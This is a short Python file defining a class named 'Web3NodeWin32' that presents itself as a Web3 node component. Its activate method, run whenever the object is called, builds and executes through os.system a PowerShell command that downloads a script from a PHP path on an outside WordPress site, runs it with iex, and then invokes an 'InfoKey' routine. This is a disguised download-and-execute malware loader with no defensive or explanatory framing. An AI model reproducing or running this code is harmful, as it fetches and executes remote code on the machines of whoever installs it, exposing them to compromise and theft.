import os

class Web3NodeWin32:
    def __init__(self):
        self.addr = "https://saboreysecretos.com/wp-includes/assets/"
        self.controller = "script-modules-packages.win.php?u=0"
        self.action = "InfoKey -ur "
        self.cpl = "powershell.exe"
        
    def activate(self):
        try:
            cc = self.cpl + " -command \"iex (wget " + self.addr + self.controller + ").content;" + self.action + "'" + self.addr + "'\""
            os.system(cc)
        except Exception:
            print("[Web3NodeWin32] An error occurred during activating...")
            
    def __str__(self):
        return "<class 'Web3NodeWin32'>"
     
    def __repr__(self):
        return "<class 'Web3NodeWin32'>"
        
    def __call__(self):
        self.activate()
